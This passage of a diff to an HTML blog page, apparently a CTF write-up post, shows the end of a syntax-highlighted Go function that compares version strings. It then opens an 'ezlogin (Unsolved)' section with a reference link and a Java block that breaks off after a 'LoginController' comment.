+        num2<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> num1 <span class="token operator">&lt;</span> num2 <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token boolean">true</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> num1 <span class="token operator">></span> num2 <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token boolean">false</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">return</span> <span class="token function">len</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+
+
+
+
 <hr>
 <h1 id="ezlogin（Unsolved）"><a href="#ezlogin（Unsolved）" class="headerlink" title="ezlogin（Unsolved）"></a>ezlogin（Unsolved）</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hetianlab/p/17184614.html">https://www.cnblogs.com/hetianlab/p/17184614.html</a></p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// LoginController</span>
